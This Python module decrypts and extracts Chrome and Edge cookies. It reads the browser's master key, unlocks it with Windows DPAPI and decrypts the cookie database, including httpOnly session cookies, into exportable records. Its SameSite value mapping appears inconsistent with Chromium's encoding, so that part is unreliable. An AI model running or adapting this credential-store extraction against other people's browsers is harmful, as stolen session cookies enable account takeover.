import os
import sys
import json
import sqlite3
import shutil
import tempfile
from typing import List, Dict, Any, Optional

class ChromiumExtractor:
    @staticmethod
    def get_chrome_user_data_path() -> Optional[str]:
        if sys.platform == "win32":
            return os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data")
        elif sys.platform == "darwin":
            return os.path.expanduser("~/Library/Application Support/Google/Chrome")
        else:
            return os.path.expanduser("~/.config/google-chrome")

    @staticmethod
    def get_edge_user_data_path() -> Optional[str]:
        if sys.platform == "win32":
            return os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data")
        elif sys.platform == "darwin":
            return os.path.expanduser("~/Library/Application Support/Microsoft Edge")
        else:
            return os.path.expanduser("~/.config/microsoft-edge")

    @staticmethod
    def get_master_key(user_data_path: str) -> Optional[bytes]:
        """
        Extracts and decrypts AES master key from Local State (Windows DPAPI / macOS / Linux).
        """
        local_state_path = os.path.join(user_data_path, "Local State")
        if not os.path.exists(local_state_path):
            return None

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            return None

        import base64
        encrypted_key = base64.b64decode(encrypted_key_b64)
        # Strip 'DPAPI' prefix (5 bytes)
        encrypted_key = encrypted_key[5:]

        if sys.platform == "win32":
            try:
                import ctypes
                import ctypes.wintypes

                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

                p_data_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
                p_data_out = DATA_BLOB()

                CryptUnprotectData = ctypes.windll.crypt32.CryptUnprotectData
                if CryptUnprotectData(ctypes.byref(p_data_in), None, None, None, None, 0, ctypes.byref(p_data_out)):
                    key = ctypes.string_at(p_data_out.pbData, p_data_out.cbData)
                    ctypes.windll.kernel32.LocalFree(p_data_out.pbData)
                    return key
            except Exception as e:
                return None
        return None

    @staticmethod
    def extract_cookies(browser: str = "chrome", profile: str = "Default", domain_filter: Optional[str] = None) -> List[Dict[str, Any]]:
        user_data = ChromiumExtractor.get_chrome_user_data_path() if browser.lower() == "chrome" else ChromiumExtractor.get_edge_user_data_path()
        if not user_data or not os.path.exists(user_data):
            return []

        cookies_db_path = os.path.join(user_data, profile, "Network", "Cookies")
        if not os.path.exists(cookies_db_path):
            # Legacy location
            cookies_db_path = os.path.join(user_data, profile, "Cookies")
        if not os.path.exists(cookies_db_path):
            return []

        # Copy to temp file to avoid SQLite database locks while browser is running
        temp_dir = tempfile.mkdtemp()
        temp_db = os.path.join(temp_dir, "Cookies.tmp")
        try:
            shutil.copy2(cookies_db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            query = "SELECT host_key, name, path, encrypted_value, is_secure, is_httponly, samesite, expires_utc FROM cookies"
            params = []
            if domain_filter:
                query += " WHERE host_key LIKE ?"
                params.append(f"%{domain_filter}%")

            cursor.execute(query, params)
            rows = cursor.fetchall()
            conn.close()

            master_key = ChromiumExtractor.get_master_key(user_data)
            results = []

            for host, name, path, enc_val, secure, httponly, samesite, expires_utc in rows:
                val = ""
                if enc_val:
                    if (enc_val.startswith(b'v10') or enc_val.startswith(b'v11')) and master_key:
                        try:
                            iv = enc_val[3:15]
                            payload = enc_val[15:]
                            try:
                                from .crypto_helper import decrypt_aes_gcm
                            except ImportError:
                                from crypto_helper import decrypt_aes_gcm
                            val = decrypt_aes_gcm(master_key, iv, payload)
                        except Exception:
                            val = "[ENCRYPTED_VALUE]"
                    elif sys.platform == "win32" and not (enc_val.startswith(b'v10') or enc_val.startswith(b'v11')):
                        # Legacy Windows DPAPI direct decryption
                        try:
                            import ctypes
                            import ctypes.wintypes
                            class DATA_BLOB(ctypes.Structure):
                                _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
                            p_data_in = DATA_BLOB(len(enc_val), ctypes.create_string_buffer(enc_val))
                            p_data_out = DATA_BLOB()
                            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_data_in), None, None, None, None, 0, ctypes.byref(p_data_out)):
                                val = ctypes.string_at(p_data_out.pbData, p_data_out.cbData).decode('utf-8', errors='replace')
                                ctypes.windll.kernel32.LocalFree(p_data_out.pbData)
                        except Exception:
                            val = "[ENCRYPTED_VALUE]"
                    else:
                        val = "[NO_KEY_OR_APP_BOUND]"
                else:
                    val = ""

                # SQLite SameSite mapping: 2 = Strict, 1 = Lax, 3 = None, 0/-1 = unspecified
                same_site_str = "Strict" if samesite == 2 else "Lax" if samesite == 1 else "None" if samesite == 3 else "unspecified"

                results.append({
                    "domain": host,
                    "name": name,
                    "path": path,
                    "value": val,
                    "secure": bool(secure),
                    "httpOnly": bool(httponly),
                    "sameSite": same_site_str,
                    "expirationDate": expires_utc / 1000000 - 11644473600 if expires_utc else None
                })
            return results
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
